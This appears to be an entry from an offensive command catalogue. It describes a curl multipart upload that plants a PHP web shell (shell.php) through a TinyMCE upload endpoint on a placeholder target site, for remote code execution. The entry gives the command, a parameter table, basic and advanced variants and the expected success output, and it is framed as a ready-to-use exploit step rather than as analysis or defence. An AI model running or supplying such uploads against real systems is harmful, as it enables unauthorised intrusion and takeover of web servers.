---
id: cmd-uuid-5678
data: >-
  curl -X POST -F "file=@shell.php" -H "Content-Type: multipart/form-data"
  http://target-marketing-site.com/tinymce/upload
tags:
  - web
  - upload
  - exploit
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:13.083Z'
verified: false
validated: true
submitted: true
---
# curl-upload-bypass

## Command

```bash
curl -X POST -F "file=@shell.php" -H "Content-Type: multipart/form-data" http://target-marketing-site.com/tinymce/upload
```

## Description

This command uses curl to perform a multipart file upload to a vulnerable TinyMCE endpoint, bypassing validation to inject a malicious PHP shell for RCE exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `-F "file=@shell.php"` | Uploads the local file shell.php as form data | Yes |
| `-H "Content-Type: multipart/form-data"` | Sets the content type for file upload | Yes |
| `http://target-marketing-site.com/tinymce/upload` | Target upload endpoint URL | Yes |

## Examples

### Basic Usage

```bash
curl -X POST -F "file=@shell.php" -H "Content-Type: multipart/form-data" http://target-site.com/tinymce/upload
```

### Advanced Usage

```bash
curl -X POST -F "file=@shell.php" -F "token=abc123" -H "Content-Type: multipart/form-data" -v http://target-site.com/tinymce/upload
```

## Expected Output

Successful response: {"file": "/uploads/shell.php"} or similar JSON indicating upload path. Errors may show validation failures if not vulnerable.

## Related

- [[Related Procedure: Exploit-TinyMCE-Upload-Bypass-for-RCE]]
